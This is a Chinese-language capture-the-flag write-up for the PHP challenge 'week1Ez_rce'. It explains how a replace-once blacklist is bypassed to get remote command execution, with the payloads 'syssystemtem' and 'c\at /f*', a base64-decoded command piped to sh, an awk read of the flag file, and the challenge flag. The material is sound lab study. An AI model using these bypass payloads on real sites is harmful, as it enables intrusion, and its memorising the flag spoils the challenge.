# week1Ez_rce

## 题目简述

页面公开 PHP 源码：GET 参数 `param1` 作为函数名，POST 参数 `param2` 作为参数，过滤后执行 `$a($b)`。两个黑名单都只做一次正则替换，因此可分别绕过函数名和命令过滤，形成远程命令执行。

## 解题过程

核心源码可概括为：

```php
$a = $_GET['param1'];
$b = $_POST['param2'];
$a = preg_replace('/system|eval|...|assert/is', '', $a);
$b = preg_replace('/cat|tac|...|flag/is', '?Q__Q?', $b);
$a($b);
```

`param1=syssystemtem` 中间的 `system` 被删除后，剩余字符会重新拼成 `system`，于是 `$a($b)` 等价于 `system($b)`。命令参数可用 shell 的转义和通配符绕过连续关键字，例如 POST 提交 `param2=c\at /f*`：PHP 黑名单看不到连续的 `cat` 和 `flag`，shell 却会把 `c\at` 解释为 `cat`，并把 `/f*` 展开为 `/flag`。

完整请求关系为：

```text
GET  /?param1=syssystemtem
POST param2=c\at /f*
```

也可以把 `cat /flag` 编码后在 shell 中还原，或用未被拦截的 `awk` 读取：

~~~sh
c\at /f*
echo Y2F0IC9mbGFn | base64 -d | sh
awk '{print $1}' /f*
~~~

仓库中的容器 flag 为：

```text
0xGame{Y0u_G0t_L1nux_Cmd!}
```

## 方法总结

- 核心方法：利用替换型黑名单的二次拼接绕过函数名过滤，再用 shell 转义、通配符或编码绕过命令关键字。
- 识别特征：用户输入被当作可调用函数，过滤器只删除/替换字符串而不采用白名单，最终进入 `system` 一类命令执行函数。
- 注意事项：函数名来自 GET、命令来自 POST，两个参数位置不能混淆；应从源码解释每个绕过为什么在 PHP 过滤后、shell 解析前仍然成立。
